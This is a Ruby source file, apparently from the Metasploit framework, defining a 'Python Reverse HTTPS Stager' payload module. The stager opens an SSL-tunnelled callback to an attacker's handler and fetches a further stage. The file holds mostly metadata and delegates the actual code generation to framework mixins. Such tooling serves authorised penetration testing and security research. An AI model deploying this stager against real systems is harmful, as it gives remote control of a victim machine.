##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Reverse HTTPS Stager',
        'Description' => 'Tunnel communication over HTTP using SSL',
        'Author' => 'Spencer McIntyre',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'Handler' => Msf::Handler::ReverseHttps,
        'Stager' => { 'Payload' => '' }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super({ scheme: 'https' })
  end
end
